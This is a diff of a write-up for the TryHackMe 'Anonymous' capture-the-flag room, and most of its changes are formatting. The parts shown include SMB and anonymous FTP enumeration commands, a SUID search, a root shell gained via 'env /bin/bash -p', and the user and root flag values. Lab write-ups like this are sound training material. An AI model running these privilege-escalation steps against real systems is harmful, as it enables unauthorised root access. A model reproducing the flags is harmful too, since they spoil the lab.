@@ -1,6 +1,6 @@
-# Anonymous *Not the hacking group*
+# Room: Anonymous (*Not the hacking group*)
 
-[Room](https://tryhackme.com/room/anonymous)
+This CTF is available on [TryHackMe](https://tryhackme.com/room/anonymous)
 
 ## Basic Enum
 
@@ -18,15 +18,17 @@ PORT    STATE SERVICE      REASON
 
 ```
 
-Enumerate the machine.  How many ports are open?
+- Enumerate the machine.  How many ports are open?
 **4**
-What service is running on port 21?
+
+- What service is running on port 21?
 **ftp**
-What service is running on ports 139 and 445?
+
+- What service is running on ports 139 and 445?
 **smb**
 
 ```shell
-smbclient -L $IP
+smbclient -L $IP (without any password)
 
 Enter WORKGROUP\root's password: 
 
@@ -40,15 +42,16 @@ SMB1 disabled -- no workgroup available
 ```
 
 There's a share on the user's computer.  What's it called?
+
 **pics**
 
-HINT: >What's that log file doing there?... nc won't work the way you'd expect it to
+> HINT: What's that log file doing there?... nc won't work the way you'd expect it to
 
 ```shell
 ftp $IP
 
 Name: anonymous
-Password:
+Password: (without any password)
 ftp> ls
 drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
 ftp> cd scripts
@@ -60,6 +63,7 @@ ftp> ls
 
 ftp> mget *
 ```
+Let's have a look on thos files.
 
 ```shell
 cat clean.sh 
@@ -112,9 +116,9 @@ namelessone@anonymous:~$
 
 ```
 
-usert.txt: **90d6f992585815ff991e68748c414740**
+- usert.txt: **90d6f992585815ff991e68748c414740**
 
-HINT: >This may require you to do some outside research
+> HINT: This may require you to do some outside research
 
 Cheers ;) so as usual in this case, gtfobins comes in \o/
 
@@ -124,9 +128,7 @@ find / -perm -u=s 2>/dev/null
 /usr/bin/env
 ```
 
-So let's try this:
-
-[gtfobins break out from restricted environments](https://gtfobins.github.io/gtfobins/env/#shell)
+So let's try this: [gtfobins break out from restricted environments](https://gtfobins.github.io/gtfobins/env/#shell)
 
 ```shell
 env /bin/bash -p
@@ -138,6 +140,4 @@ bash-4.4#
 
 ```
 
-root.txt:**4d930091c31a622a7ed10f27999af363**
-
-
+- root.txt:**4d930091c31a622a7ed10f27999af363**
